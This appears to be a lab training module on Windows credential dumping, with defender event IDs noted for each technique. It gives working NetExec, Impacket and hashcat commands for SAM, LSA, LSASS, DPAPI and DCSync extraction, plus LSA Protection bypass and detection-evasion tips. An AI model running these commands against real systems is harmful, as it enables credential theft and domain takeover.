# Module 03: Credential Dumping and Harvesting

## What This Module Covers

You have enumerated the domain. You know the users, the groups, the attack paths. You found Kerberoastable accounts, AS-REP Roastable accounts, ACL misconfigurations, and delegation issues. But all of that information is just a map. To actually move through the network, you need credentials.

This module teaches you how to extract passwords, hashes, tickets, and secrets from Windows machines. Credential dumping is the single most impactful post-exploitation activity because every credential you recover opens new doors. A local admin hash lets you move laterally. A domain user password lets you Kerberoast. A Domain Admin hash lets you own the entire forest.

By the end of this module you will have:

- Extracted local account NTLM hashes from the SAM database
- Recovered LSA secrets including service account passwords stored in cleartext
- Dumped LSASS process memory to harvest active session credentials
- Recovered cached domain credentials (DCC2 hashes) for offline cracking
- Extracted DPAPI-protected secrets (saved browser passwords, stored credentials)
- Found plaintext credentials in files, registry keys, and AutoLogon configurations
- Performed a DCSync attack to replicate the entire domain's password database
- Understood what each technique looks like to defenders and what Event IDs are generated

Every technique is executed remotely from Kali using NetExec and Impacket. No tools are dropped on Windows hosts.

---

## Prerequisites

Before starting this module you need:

- Modules 00 and 01 completed (lab built, domain enumerated)
- DC01 is up and reachable (Windows Server 2022, IP ending in .10)
- WS01 is domain-joined and reachable (Windows 10/11, IP ending in .20)
- Kali Linux on the same NAT network
- Local admin credentials for WS01 (you need admin access to dump credentials)

### Your Credentials

For this module, you will use multiple sets of credentials depending on the exercise:

| Account | Password | Where It Works | Access Level |
|:--------|:---------|:---------------|:-------------|
| `vamsi.krishna` | `OrsUBank2024!` | Domain-wide | Standard domain user |
| `operator` | `LabAdmin@2026!` | WS01 only | Local administrator on WS01 |
| `Administrator` | `OrsUBank2024!` | DC01 (domain admin) | Domain Admin |

**How did we get the `operator` account?** In a real engagement, you would have escalated privileges on WS01 first (Module 02 covers local privilege escalation). For this module, we assume you have already achieved local admin access on the workstation through one of several privilege escalation paths (unquoted service path, weak service permissions, AlwaysInstallElevated, etc.). The `operator` account simulates the result of that escalation.

> **Why local admin matters:** Almost every credential dumping technique requires local administrator privileges on the target machine. Without admin access, you cannot read the SAM database, access LSASS memory, or query LSA secrets. This is why privilege escalation comes before credential dumping in the attack chain.

### Tool Setup

All tools used in this module come pre-installed on Kali or are easily available:

```bash
# NetExec (primary tool for remote credential extraction)
nxc --version

# Impacket (secretsdump.py for DCSync and remote hash extraction)
which secretsdump.py
# If not found:
pip install impacket

# Hashcat (for cracking extracted hashes)
hashcat --version
```

---

## Our Scenario

Continuing from Module 01: you compromised vamsi.krishna's credentials through a phishing attack. You enumerated the entire domain and mapped all the attack paths. During your enumeration, you also discovered a local admin account on WS01 (the `operator` account, or you escalated privileges through a vulnerable service).

Now you are going to harvest every credential you can find. Each credential you recover either directly escalates your access or gives you a new identity to pivot from.

Think of it like robbing a bank vault. Module 01 was casing the building and finding the blueprints. This module is cracking the safe. Module 09 (Domain Dominance) is walking out with everything.

---

## Part 1: How Windows Stores Credentials

Before you start extracting credentials, you need to understand where Windows keeps them. If you skip this section, you will run tools blindly and not understand why some techniques work on workstations but not on domain controllers, or why some hashes can be used for pass-the-hash while others cannot.

### The Five Credential Stores

Windows stores credentials in five different places, each with its own format, protection mechanism, and usefulness to an attacker:

```
+------------------------------------------------------------------+
|                     Windows Credential Storage                    |
+------------------------------------------------------------------+
|                                                                    |
|  1. SAM Database (Local Accounts)                                  |
|     Location: C:\Windows\System32\config\SAM                      |
|     Contains: NTLM hashes of local user accounts                  |
|     Protection: Encrypted with SYSTEM key (boot key)              |
|     Useful for: Pass-the-Hash to other machines with same         |
|                 local admin password                               |
|                                                                    |
|  2. LSA Secrets (Service/System Credentials)                       |
|     Location: HKLM\SECURITY\Policy\Secrets                        |
|     Contains: Service account passwords, machine account          |
|               password, DPAPI keys, cached credentials            |
|     Protection: Encrypted with LSA key                            |
|     Useful for: Service account passwords in cleartext,           |
|                 machine account hash for silver tickets            |
|                                                                    |
|  3. LSASS Process Memory (Active Sessions)                         |
|     Location: lsass.exe process memory (PID varies)               |
|     Contains: NTLM hashes, Kerberos tickets, and                 |
|               cleartext passwords (if WDigest is on)              |
|     Protection: Protected Process Light (if LSA Protection        |
|                 is enabled), Credential Guard (if VBS is on)      |
|     Useful for: Currently logged-in user credentials,             |
|                 pass-the-hash, pass-the-ticket                    |
|                                                                    |
|  4. Cached Domain Credentials (Offline Logon)                      |
|     Location: HKLM\SECURITY\Cache                                 |
|     Contains: DCC2/mscash2 hashes of last 10 domain logins       |
|     Protection: PBKDF2 with 10,240 iterations                    |
|     Useful for: Offline cracking only (cannot pass-the-hash)      |
|                                                                    |
|  5. NTDS.dit (Domain Controller Only)                              |
|     Location: C:\Windows\NTDS\ntds.dit (on DCs)                  |
|     Contains: NTLM hashes for every user in the domain           |
|     Protection: Encrypted with PEK (stored in NTDS.dit itself)   |
|     Useful for: Every single domain credential at once            |
|                                                                    |
+------------------------------------------------------------------+
```

### How Each Store Gets Populated

Understanding when credentials enter each store helps you plan your attack:

**SAM database:** Gets updated when you create a local user account or change a local password. Every Windows machine has a SAM database, including domain controllers (but on DCs, the important hashes are in NTDS.dit, not SAM). The SAM file is locked by the operating system while Windows is running, which is why you cannot simply copy it. You need either registry access (through the `reg save` command) or Volume Shadow Copy to get at it.

**LSA secrets:** Gets populated when you configure a Windows service to run under a specific account (like "Log on as: ORSUBANK\sqlservice"). The service's password is stored here so Windows can start the service after a reboot without asking for the password again. It also stores the machine account password (the `WS01$` or `DC01$` account that the computer uses to authenticate to the domain).

Think of it this way: when your company's IT admin sets up a backup service to run as a specific user account, they enter the password once in the Services console. That password has to be stored somewhere so the service can start automatically. It goes into LSA secrets. And it sits there, recoverable by anyone with local admin access.

**LSASS process memory:** Gets populated the moment a user logs into the machine. When you type your password at the Windows login screen, Windows sends it to LSASS (Local Security Authority Subsystem Service). LSASS validates the password against the domain controller (or SAM for local accounts), and then stores credential material in memory for Single Sign-On purposes. This includes NTLM hashes, Kerberos TGTs, and if WDigest authentication is enabled, the actual cleartext password.

This is the richest credential store because it contains live session data. If a Domain Admin logged into this workstation even once (to install software, troubleshoot an issue, or check something), their credentials are sitting in LSASS memory until the machine is rebooted or they explicitly log off.

**Cached domain credentials:** Gets populated every time a domain user successfully logs into the machine. Windows caches the last 10 domain logons by default (controlled by the `CachedLogonsCount` registry value at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`). This cache exists so users can log in even when the domain controller is unreachable (think: a laptop on an airplane).

The catch is that cached credentials use a different hash format called DCC2 (Domain Cached Credentials version 2, also known as mscash2). DCC2 hashes are salted with the username and run through 10,240 rounds of PBKDF2. This makes them very slow to crack and completely unusable for pass-the-hash attacks. You can only crack them offline with hashcat (mode 2100).

**NTDS.dit:** This is the Active Directory database file, and it only exists on domain controllers. It contains the NTLM hash for every single user account in the domain. Getting access to NTDS.dit is the ultimate goal because it gives you every credential at once. You can access it through DCSync (which simulates domain controller replication) or by extracting the file directly using Volume Shadow Copy.

### What Format Are the Hashes?

Different credential stores produce different hash formats. This matters because the format determines what you can do with the hash:

| Source | Hash Format | Pass-the-Hash? | Crackable? | Hashcat Mode |
|:-------|:-----------|:---------------|:-----------|:-------------|
| SAM | NTLM (NT hash) | Yes | Yes | 1000 |
| LSA Secrets | Cleartext or NTLM | N/A (often cleartext) | N/A | N/A |
| LSASS Memory | NTLM + Kerberos tickets + possibly cleartext | Yes (NTLM), Yes (tickets) | Yes | 1000 |
| Cached Creds | DCC2/mscash2 | No | Yes (slow) | 2100 |
| NTDS.dit | NTLM (NT hash) | Yes | Yes | 1000 |

**Why can you not pass-the-hash with DCC2?** Because pass-the-hash works by injecting an NTLM hash into the authentication process. The target server uses NTLM to validate the hash. DCC2 is a completely different hash algorithm (PBKDF2-based). No Windows service accepts DCC2 hashes for authentication. They exist solely for offline logon verification.

### The WDigest Problem

WDigest is an authentication protocol from the Windows XP era. When WDigest is enabled, Windows stores a reversible copy of the user's password in LSASS memory. "Reversible" means you can recover the actual plaintext password, not just the hash.

Microsoft disabled WDigest cleartext storage by default starting with Windows 8.1 and Server 2012 R2. But here is the problem: you can re-enable it by setting a single registry key:

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
Value: UseLogonCredential = 1
```

After setting this value and waiting for a user to log in (or re-authenticate), their cleartext password will appear in LSASS memory. In our lab, the setup script already enabled WDigest on both DC01 and WS01 to simulate a legacy or misconfigured environment.

In real engagements, you will find WDigest enabled more often than you would expect. Legacy applications sometimes require it. Lazy GPO configurations leave it on. And some organizations simply never hardened this setting because they did not know it existed.

### LSA Protection and Credential Guard

Microsoft introduced two defenses to protect LSASS memory:

**LSA Protection (RunAsPPL):** This runs LSASS as a Protected Process Light (PPL). A PPL process can only be accessed by other PPL processes or kernel-mode drivers. Regular processes (including your credential dumping tools) cannot open a handle to LSASS with sufficient access rights to read its memory. This is controlled by the registry key `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`.

**Credential Guard (VBS):** This uses Virtualization-Based Security to isolate credential material in a separate, hardware-protected container. Even if an attacker has kernel access, they cannot read the credentials because they are stored in a different virtual trust level. This is the strongest protection available and is controlled by `HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\EnableVirtualizationBasedSecurity`.

In our lab, both protections are deliberately disabled to allow you to practice credential dumping techniques. In a real engagement, you will encounter these protections and need to either bypass them (LSA Protection has known bypasses using vulnerable drivers) or find alternative paths that do not require LSASS access (like Kerberoasting, ADCS abuse, or DCSync if you have the right permissions).

---

## Part 2: SAM and LSA Secrets (Registry Hive Extraction)

The SAM database and LSA secrets are the first credentials you should extract from any machine you have admin access to. They are stored in registry hives, which means the extraction is a registry operation, not a memory access operation. This makes it more reliable and less likely to crash the target than dumping LSASS memory.

### How SAM Dumping Works Under the Hood

When you run `nxc smb <target> --sam`, here is what happens step by step:

1. NetExec authenticates to the target over SMB (port 445) using the credentials you provide.
2. It opens a remote registry connection via the `winreg` named pipe (`\pipe\winreg`).
3. It calls `RegSaveKeyW` on three registry hives: `HKLM\SAM`, `HKLM\SYSTEM`, and `HKLM\SECURITY`.
4. These hives are saved as temporary files on the target (usually in `C:\Windows\Temp`).
5. NetExec downloads the files over SMB, parses them locally, and displays the extracted hashes.
6. It cleans up the temporary files from the target.

The `SYSTEM` hive is needed because it contains the boot key (also called the SYSKEY). The SAM database is encrypted with this boot key. Without the SYSTEM hive, the SAM hashes are encrypted gibberish.

> **Protocol used:** SMB (port 445) for authentication and file transfer, Remote Registry Service (RPC) for saving the hives.
>
> **What defenders see:** Event ID 4656 and 4663 (registry access audit), Event ID 5145 (network share access to retrieve the saved files). The Remote Registry service must be running on the target. NetExec will try to start it if it is stopped.

### Lab Exercise 1: Dump SAM Hashes from WS01

You need local admin credentials for this. The `operator` account is a local admin on WS01.

```bash
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth --sam
```

**Breaking down the flags:**
- `<WS_IP>`: Replace with WS01's IP (ending in .20)
- `-u 'operator'`: The local admin username
- `-p 'LabAdmin@2026!'`: The password (single quotes because of the `!`)
- `--local-auth`: This tells NetExec to authenticate against WS01's local SAM database, not the domain. Without this flag, it would try to authenticate as `ORSUBANK\operator`, which does not exist.
- `--sam`: Dump the SAM database

**Expected output:**

You should see NTLM hashes for every local account on WS01:

```
SMB    <WS_IP>   445  WS01  [*] Windows 10.0 Build xxxxx x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:False)
SMB    <WS_IP>   445  WS01  [+] WS01\operator:LabAdmin@2026! (Pwn3d!)
SMB    <WS_IP>   445  WS01  [+] Dumping SAM hashes
SMB    <WS_IP>   445  WS01  Administrator:500:<LM_HASH>:<NT_HASH>:::
SMB    <WS_IP>   445  WS01  Guest:501:<LM_HASH>:<NT_HASH>:::
SMB    <WS_IP>   445  WS01  DefaultAccount:503:<LM_HASH>:<NT_HASH>:::
SMB    <WS_IP>   445  WS01  labuser:1001:<LM_HASH>:<NT_HASH>:::
SMB    <WS_IP>   445  WS01  operator:1002:<LM_HASH>:<NT_HASH>:::
```

**What to do with these hashes:**

The `labuser` hash is the account used to install Windows on WS01. The password was `P@ssw0rd123!`. The `operator` hash is the local admin the lab created.

Here is the critical question: **is the `Administrator` hash the same on both WS01 and DC01?** If it is, that means the local Administrator password is reused across machines. This is extremely common in real networks because admins often set the same local admin password on every machine using a golden image or a script. If you crack or pass-the-hash with that Administrator hash, you can move to every machine that shares it.

Save these hashes to a file for later cracking:

```bash
# Save the output for hashcat
echo '<NT_HASH_HERE>' > ws01_sam_hashes.txt
```

### Lab Exercise 2: Dump LSA Secrets from WS01

LSA secrets are often more valuable than SAM hashes because they can contain cleartext service account passwords.

```bash
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth --lsa
```

**Expected output:**

You should see several types of secrets:

```
SMB    <WS_IP>   445  WS01  [+] Dumping LSA Secrets
SMB    <WS_IP>   445  WS01  ORSUBANK.LOCAL/WS01$:aes256-cts-hmac-sha1-96:<KEY>
SMB    <WS_IP>   445  WS01  ORSUBANK.LOCAL/WS01$:aes128-cts-hmac-sha1-96:<KEY>
SMB    <WS_IP>   445  WS01  ORSUBANK.LOCAL/WS01$:des-cbc-md5:<KEY>
SMB    <WS_IP>   445  WS01  ORSUBANK.LOCAL/WS01$:plain_password_hex:<HEX>
SMB    <WS_IP>   445  WS01  ORSUBANK.LOCAL/WS01$:<LM>:<NT>:::
SMB    <WS_IP>   445  WS01  ORSUBANK\svc_autologon:AutoLogon@2024!
SMB    <WS_IP>   445  WS01  (Unknown User):DCC2 hash...
```

**What you found:**

1. **Machine account hash (`WS01$`):** This is the NTLM hash of WS01's computer account in the domain. The machine account password is randomly generated and 240+ characters long, so you cannot crack it. But you can use this hash for Silver Ticket attacks or, in our lab, WS01$ has DCSync rights (configured in the setup script). This means you can perform a DCSync attack using the machine account.

2. **AutoLogon credentials (`svc_autologon`):** The setup script planted stored AutoLogon credentials in the Winlogon registry key. These appear in LSA secrets as cleartext: `svc_autologon / AutoLogon@2024!`. In real environments, AutoLogon is used for kiosk machines, shared workstations, and build servers. The password is stored in cleartext in the registry and extracted via LSA secrets.

3. **Cached credentials (DCC2 hashes):** These are the hashed domain credentials for users who logged into WS01 previously. We will cover cracking these in Part 4.

> **Real-world context:** In actual pentests, the most common goldmine in LSA secrets is service account passwords. Companies set up Windows services to run as domain accounts (for backups, monitoring, database connections, etc.) and those passwords sit in LSA secrets forever. You will also frequently find stored AutoLogon credentials on shared workstations in reception areas, conference rooms, and factory floors.

### Lab Exercise 3: Dump SAM Hashes from DC01

Now let us hit the domain controller. You need Domain Admin credentials for this:

```bash
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' --sam
```

Notice there is no `--local-auth` flag here because `Administrator` is a domain account (the built-in Domain Admin).

The SAM on a DC typically shows fewer interesting local accounts since domain accounts are stored in NTDS.dit, not SAM. But it still contains the local `Administrator` account hash.

### Lab Exercise 4: Dump LSA Secrets from DC01

```bash
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' --lsa
```

On a domain controller, LSA secrets are particularly interesting because they contain:

- The `DC01$` machine account hash (every DC has one)
- DPAPI backup keys (used to decrypt any user's DPAPI-protected data across the domain)
- Cached credentials for any admin who logged into the DC console
- The krbtgt account hash history (in some configurations)

> **What defenders see:** Remotely saving registry hives generates Event ID 4656 (handle request to registry key) and Event ID 4663 (registry key accessed) if Object Access auditing is enabled. The Remote Registry service starting unexpectedly is also a red flag. Microsoft Defender for Identity (MDI) specifically detects remote registry enumeration patterns.

### Using Impacket's secretsdump.py as an Alternative

NetExec's `--sam` and `--lsa` flags are wrappers around the same logic that Impacket's `secretsdump.py` uses. If you want more control or if NetExec has issues, use secretsdump.py directly:

```bash
# Dump SAM from WS01 (local auth)
secretsdump.py 'operator:LabAdmin@2026!@<WS_IP>'

# Dump everything from DC01 (domain admin)
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>'
```

`secretsdump.py` with no additional flags dumps everything it can: SAM, LSA secrets, cached credentials, and NTDS.dit (on DCs). It is the Swiss Army knife of credential extraction.

---

## Part 3: LSASS Memory Dumping (The Crown Jewels)

LSASS memory is the richest credential source on any Windows machine because it contains credentials for every user who has an active session. Unlike SAM (which only has local accounts) or LSA secrets (which has service accounts), LSASS has whatever domain users are currently logged in.

### Why LSASS Contains So Much

When a domain user logs into WS01, here is what gets stored in LSASS memory:

1. **Their NTLM hash:** Used for NTLM authentication. You can pass-the-hash with this.
2. **Their Kerberos TGT:** Used for Kerberos authentication. You can pass-the-ticket with this.
3. **Their cleartext password (if WDigest is enabled):** Directly usable for authentication.
4. **Kerberos session keys:** Used for current Kerberos sessions.

This means if a Domain Admin remoted into WS01 to fix a printer driver, their credentials are sitting in memory. If a service account was configured to run interactively, its credentials are there. If the user locked their screen instead of logging off, their credentials are still there.

In real engagements, this is how most lateral movement chains start. You compromise one workstation, dump LSASS, find an IT admin's hash who logged in to push a software update, pass-the-hash to the next machine, dump LSASS there, find a Domain Admin's hash, and game over.

### How Remote LSASS Dumping Works

When you run `nxc smb <target> -M lsassy`, here is what happens:

1. NetExec authenticates to the target over SMB.
2. The `lsassy` module connects to the target and identifies the LSASS process ID.
3. It uses one of several methods to create a memory dump of the LSASS process. The default method uses `comsvcs.dll`, which is a legitimate Microsoft DLL present on every Windows system. It calls the `MiniDumpWriteDump` function through `rundll32.exe`.
4. The dump file is written to a temporary location on the target (usually `C:\Windows\Temp\`).
5. `lsassy` downloads the dump file over SMB.
6. It parses the dump locally using `pypykatz` (a Python implementation of Mimikatz) and extracts all credential material.
7. It cleans up the dump file from the target.

The beauty of this approach is that the parsing happens on your Kali machine, not on the target. No offensive tools touch the Windows disk. The only thing that runs on the target is `rundll32.exe` calling a built-in Microsoft DLL.

> **Protocol used:** SMB (port 445) for authentication and file transfer, WMI or remote task scheduling for execution, comsvcs.dll for the actual memory dump.
>
> **What defenders see:** Sysmon Event ID 10 (ProcessAccess) when the dumping process opens a handle to lsass.exe with suspicious access masks (0x1010, 0x1FFFFF). Event ID 4688 (Process Creation) showing `rundll32.exe` with `comsvcs.dll` in the command line. Event ID 4663 (Object Access) confirming memory read on lsass.exe. Modern EDRs specifically monitor for `comsvcs.dll` being used this way and will often block it.

### Lab Exercise 5: Dump LSASS from WS01 Using lsassy

First, make sure someone is logged into WS01. For this exercise to be interesting, log into WS01 using the `vamsi.krishna` domain account (or make sure a domain user has logged in recently and has not rebooted). Remember, LSASS only contains credentials for users with active sessions.

```bash
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -M lsassy
```

**Expected output:**

```
SMB    <WS_IP>   445  WS01  [+] WS01\operator:LabAdmin@2026! (Pwn3d!)
LSASSY <WS_IP>   445  WS01  [+] ORSUBANK\vamsi.krishna <NT_HASH>
LSASSY <WS_IP>   445  WS01  [+] ORSUBANK\vamsi.krishna OrsUBank2024!
LSASSY <WS_IP>   445  WS01  [+] ORSUBANK\labuser <NT_HASH>
```

If WDigest is enabled (which it is in our lab), you will see cleartext passwords alongside the NTLM hashes. The line showing `OrsUBank2024!` is the actual cleartext password recovered from WDigest storage in LSASS memory.

**What you found:**

Every domain user who logged into WS01 since the last reboot has their credentials exposed. In our lab that includes `vamsi.krishna`. In a real network with 50 workstations, you would move from machine to machine, dumping LSASS on each one, collecting credentials like snowballs rolling downhill.

### Lab Exercise 6: Dump LSASS from DC01

Domain controllers are the highest-value targets for LSASS dumping because every domain authentication passes through the DC. Any user who authenticated to the domain recently has credential material in the DC's LSASS memory.

```bash
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' -M lsassy
```

On a DC, you should see credentials for multiple domain accounts, including service accounts that authenticate to the DC and any admin accounts with active sessions.

> **OPSEC warning:** Dumping LSASS on a domain controller in a real engagement is extremely high-risk. DCs are the most monitored machines in any enterprise. Microsoft Defender for Identity (MDI) has specific detections for LSASS access on DCs. Only do this if you have already confirmed that EDR is not present or if you have exhausted quieter alternatives (like DCSync).

### Lab Exercise 7: Alternative Methods for LSASS Dumping

If `lsassy` does not work (maybe the comsvcs.dll method is blocked), try the `nanodump` module:

```bash
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -M nanodump
```

`nanodump` is stealthier than `lsassy` because it uses indirect syscalls and can create a partial dump that is harder for security products to detect. It also avoids using well-known signatures like `comsvcs.dll`.

You can also use `secretsdump.py` which extracts credentials through registry operations rather than LSASS memory access:

```bash
secretsdump.py 'operator:LabAdmin@2026!@<WS_IP>'
```

This approach does not touch LSASS at all. It reads SAM, LSA secrets, and cached credentials through the remote registry. The trade-off is that you do not get active session credentials (currently logged-in users' hashes and tickets). You only get what is stored in the registry hives.

### The Order of Operations for Credential Extraction

In a real engagement, here is the recommended order:

```
Step 1: SAM + LSA Secrets (least risky, registry-based)
    nxc smb <target> -u <admin> -p <pass> --sam --lsa

Step 2: LSASS Memory (moderate risk, process memory access)
    nxc smb <target> -u <admin> -p <pass> -M lsassy

Step 3: DPAPI Secrets (low risk, file-based)
    nxc smb <target> -u <admin> -p <pass> --dpapi

Step 4: DCSync (highest reward but highest risk, DC replication)
    secretsdump.py -just-dc <domain>/<user>:<pass>@<DC_IP>
```

You start with the safest technique (registry hives) and escalate to riskier techniques only if you need more credentials. There is no point dumping LSASS (which might trigger EDR) if you already found a Domain Admin password in LSA secrets from Step 1.

---

## Part 4: Cached Domain Credentials (DCC2/mscash2)

Cached credentials are a special case. They are less useful than SAM or LSASS dumps, but they can save an engagement when nothing else works.

### Why Windows Caches Credentials

Imagine this scenario: an employee takes their laptop home. They open it at their kitchen table, away from the corporate network. They type their domain password and Windows logs them in. But how? The domain controller is at the office, unreachable. The answer is cached credentials.

Every time a domain user successfully logs into a Windows machine, Windows stores a cached version of their credentials locally. The default is 10 cached logons (controlled by `CachedLogonsCount` in the registry). This allows offline logon when the DC is not reachable.

For pentesters, this is interesting because it means that workstations and laptops contain domain credential material even when the DC is down or unreachable from your position.

### The DCC2 Hash Format

Cached credentials use a format called DCC2 (Domain Cached Credentials version 2), also known as mscash2. This is NOT the same as NTLM:

| Property | NTLM Hash | DCC2 Hash |
|:---------|:----------|:----------|
| Algorithm | MD4 | PBKDF2-HMAC-SHA1 |
| Iterations | 1 | 10,240 |
| Salt | None | Username (lowercase) |
| Pass-the-Hash? | Yes | No |
| Cracking speed | Very fast (~100 GH/s on GPU) | Very slow (~1 MH/s on GPU) |
| Hashcat mode | 1000 | 2100 |

The key takeaway: DCC2 hashes are 100,000 times slower to crack than NTLM hashes. A password that takes 1 second to crack via NTLM would take over a day via DCC2. And you absolutely cannot use them for pass-the-hash because no Windows authentication protocol accepts this format.

So why bother? Because sometimes a cached credential is the only credential available. If you compromise a laptop that has been disconnected from the domain, cached credentials might be all you get. And if the password is weak enough (like `Summer2024!`), you can still crack it.

### Lab Exercise 8: Extract Cached Credentials from WS01

Cached credentials are included in the LSA dump. You already extracted them in Exercise 2. But you can also use secretsdump.py to specifically target them:

```bash
secretsdump.py 'operator:LabAdmin@2026!@<WS_IP>'
```

In the output, look for lines formatted like:

```
[*] Dumping cached domain logon information (domain/username:hash)
ORSUBANK.LOCAL/vamsi.krishna:$DCC2$10240#vamsi.krishna#<HASH>
ORSUBANK.LOCAL/labuser:$DCC2$10240#labuser#<HASH>
```

The format `$DCC2$10240#username#hash` is the hashcat-compatible format.

### Lab Exercise 9: Crack Cached Credentials with Hashcat

Save the DCC2 hash to a file and crack it:

```bash
# Save the hash
echo '$DCC2$10240#vamsi.krishna#<HASH_VALUE>' > dcc2_hashes.txt

# Crack with hashcat (mode 2100)
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
```

Since `OrsUBank2024!` is in many wordlists (or close to common patterns), hashcat should crack it. But notice how much slower this is compared to cracking NTLM hashes with mode 1000.

> **Real-world context:** In actual pentests, cracking DCC2 hashes is a last resort because of the speed penalty. But it has saved engagements. One common scenario: you compromise an IT admin's laptop at a branch office. The laptop has cached credentials for the IT admin's domain account. The IT admin uses the same password for their admin account and their regular account. You crack the DCC2 hash, recover their password, and use it to authenticate to the domain with their admin account. The password reuse is what makes this work.

---

## Part 5: DPAPI (Data Protection API) Secrets

DPAPI is one of the most overlooked credential sources in pentesting. Most beginners focus on SAM, LSASS, and NTDS.dit, but ignore DPAPI entirely. This is a mistake because DPAPI protects a treasure trove of sensitive data that users store on their workstations.

### What DPAPI Protects

DPAPI (Data Protection API) is a Windows built-in encryption system that applications use to protect sensitive data. When a program calls the `CryptProtectData` function, Windows encrypts the data using a key derived from the user's password. Here is what gets protected by DPAPI:

- **Chrome and Edge saved passwords:** Every password saved in your browser is encrypted with DPAPI.
- **Wi-Fi passwords:** Wireless network keys stored on the machine.
- **Windows Credential Manager entries:** Saved RDP passwords, web credentials, and application credentials.
- **Outlook passwords:** Email account credentials.
- **VPN credentials:** Saved VPN connection passwords.
- **Certificate private keys:** In some configurations.

Think about it: when an employee saves their corporate email password in Chrome, or saves an RDP connection to a server with "Remember my credentials" checked, that data is encrypted with DPAPI. If you can break DPAPI, you get all of it.

### How DPAPI Works (Simplified)

DPAPI uses a hierarchy of keys:

```
User's Password
    |
    v
User Master Key (stored in %APPDATA%\Microsoft\Protect\{SID}\{GUID})
    |
    v
Application-specific encrypted blob (browser passwords, WiFi keys, etc.)
```

Each user has one or more master keys. A master key is derived from the user's password. When an application wants to encrypt data, it asks DPAPI to do it. DPAPI uses the current master key to encrypt the data and stores a reference to which master key was used (the GUID) inside the encrypted blob.

To decrypt the data, you need the master key. To get the master key, you need either:
1. The user's plaintext password or NTLM hash
2. The domain DPAPI backup key (stored on the DC, recoverable with Domain Admin access)

Option 2 is why DPAPI is so devastating after domain compromise. The domain backup key can decrypt any user's master keys across the entire domain. Microsoft designed this as a recovery mechanism (in case a user forgets their password, IT can still recover their encrypted data). Attackers use it to mass-decrypt every saved credential in the domain.

### Lab Exercise 10: Extract DPAPI Secrets from WS01

NetExec has a built-in `--dpapi` flag for extracting DPAPI-protected credentials:

```bash
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth --dpapi
```

This will attempt to extract DPAPI-protected secrets including saved browser passwords, Credential Manager entries, and other DPAPI blobs.

Alternatively, if you have domain admin access, you can extract the DPAPI domain backup key from the DC and use it to decrypt any user's secrets:

```bash
# Extract DPAPI domain backup key from DC01
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>' -just-dc-user 'krbtgt'
```

The domain backup key is stored in the `BCKUPKEY` LSA secret on the domain controller. Once you have this key, you can decrypt any user's DPAPI master keys without knowing their individual passwords.

> **Real-world context:** DPAPI extraction is one of the most underrated post-exploitation techniques. In real engagements, you will find Chrome passwords for internal web applications (Jenkins, GitLab, internal wikis), saved RDP credentials to servers that were not in your initial scope, and Wi-Fi passwords for networks you did not know existed. One Chrome password for a CI/CD pipeline can lead to source code access and supply chain compromise.

### Lab Exercise 11: Extract DPAPI Secrets Using Impacket

For more targeted DPAPI extraction, use Impacket's `dpapi.py`:

```bash
# If you have a user's NTLM hash (from LSASS or SAM), decrypt their master keys
dpapi.py masterkey -file <masterkey_file> -sid <user_sid> -password '<password>'

# Decrypt a specific credential blob
dpapi.py credential -file <blob_file> -key <extracted_master_key>
```

In practice, NetExec's `--dpapi` flag handles most of the heavy lifting. Use Impacket's `dpapi.py` when you need more granular control or when working with extracted files offline.

> **What defenders see:** DPAPI extraction generates Event ID 4662 (DS-Access) when the domain backup key is queried from the DC. On the workstation, it generates file access events for the `%APPDATA%\Microsoft\Protect\` directory and the `%APPDATA%\Microsoft\Credentials\` directory. There are no well-known detection signatures specifically for DPAPI extraction, making it one of the quieter credential harvesting techniques.

---

## Part 6: Credential Files and Registry Secrets

Not all credentials are stored in encrypted databases or protected memory. Some of the most valuable credentials in real networks are sitting in plaintext files, configuration files, scripts, and registry keys. These are the low-hanging fruit that every pentester should check before moving to more complex extraction techniques.

### Why Plaintext Credentials Exist

IT administrators are human. They need to remember passwords for dozens of systems. They write them down. They put them in scripts. They store them in shared folders. They paste them into configuration files. This is not because they are lazy or incompetent. It is because managing credentials across a complex infrastructure is genuinely hard, and most organizations do not have enterprise password management solutions deployed to every team.

In our lab, the setup script planted realistic credential files in locations where real IT teams commonly store them.

### Lab Exercise 12: Hunt for Credential Files on DC01

From Kali, use NetExec to spider shares and look for interesting files:

```bash
# Spider the C$ share on DC01 for files containing "password" or "credential"
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' -M spider_plus
```

The spider_plus module crawls all accessible shares and lists files. Look for files in these common locations:

- `C:\IT\` (IT department scripts and documentation)
- `C:\Backup\` (backup configurations)
- `C:\Scripts\` (automation scripts)
- `C:\Users\<username>\Desktop\` (files left on desktops)

To read the files, use `smbclient` from Kali:

```bash
# Connect to the C$ share on DC01
smbclient '\\<DC_IP>\C$' -U 'ORSUBANK\Administrator%OrsUBank2024!'

# Navigate and read files
cd IT
get passwords.txt

cd ../Backup
get database_credentials.txt

cd ../Scripts
get service_accounts.txt
```

**What you will find in our lab:**

The setup script planted three credential files:

**C:\IT\passwords.txt:**
```
ORSUBANK IT ADMIN PASSWORDS (CONFIDENTIAL)
-------------------------------------------

Domain Admin Backup Account:
  Username: ammulu.orsu
  Password: OrsUBank2024!

SQL Server SA Account:
  Username: sa
  Password: SQLAdmin@2024!

VPN Emergency Access:
  Username: vpnadmin
  Password: VPNUser123!

Remote Support Tool:
  Username: support
  Password: Support@Bank2024
```

**C:\Backup\database_credentials.txt:**
```
Production SQL:
  Server: DC01.orsubank.local
  User: sqlservice
  Password: MYpassword123#

Backup SQL:
  Server: DC01.orsubank.local,1434
  User: backupservice
  Password: SQLAgent123!
```

